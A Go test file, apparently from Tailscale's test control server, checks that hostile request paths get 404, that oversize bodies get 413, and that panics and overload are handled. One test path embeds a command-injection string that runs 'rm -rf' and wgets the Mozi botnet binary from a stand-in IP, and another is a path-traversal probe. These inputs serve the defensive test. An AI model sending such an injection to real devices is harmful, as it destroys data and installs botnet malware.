package testcontrol

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"tailscale.com/types/key"
	"testing"
)

func TestHostileRequests(t *testing.T) {
	s := new(Server)
	for _, inner := range []bool{false, true} {
		for _, path := range []string{"/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.0.2.1/Mozi.a", "/", "/machine/unknown", "/machine/tka/bogus", "/%2e%2e/board.cgi"} {
			r := httptest.NewRequest("GET", path, nil)
			if inner {
				r = r.WithContext(context.WithValue(r.Context(), peerMachinePublicContextKey{}, key.NewMachine().Public()))
			}
			w := httptest.NewRecorder()
			s.ServeHTTP(w, r)
			if w.Code != 404 {
				t.Fatalf("%s: %d", path, w.Code)
			}
		}
	}
	w := httptest.NewRecorder()
	s.ServeHTTP(w, httptest.NewRequest("GET", "/healthz", nil))
	if w.Code != 200 {
		t.Fatal(w.Code)
	}
}

func TestBoundsAndRecovery(t *testing.T) {
	s := new(Server)
	for _, knownLength := range []bool{true, false} {
		r := httptest.NewRequest("GET", "/key", strings.NewReader(strings.Repeat("x", msgLimit+1)))
		if !knownLength {
			r.ContentLength = -1
		}
		w := httptest.NewRecorder()
		s.ServeHTTP(w, r)
		if w.Code != 413 {
			t.Fatal(w.Code)
		}
	}
	w := httptest.NewRecorder()
	s.guarded(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { panic("invalid") })).ServeHTTP(w, httptest.NewRequest("GET", "/key", nil))
	if w.Code != 400 {
		t.Fatal(w.Code)
	}
	for i := 0; i < cap(requests); i++ {
		requests <- struct{}{}
	}
	w = httptest.NewRecorder()
	s.ServeHTTP(w, httptest.NewRequest("GET", "/healthz", nil))
	for i := 0; i < cap(requests); i++ {
		<-requests
	}
	if w.Code != 503 {
		t.Fatal(w.Code)
	}
}
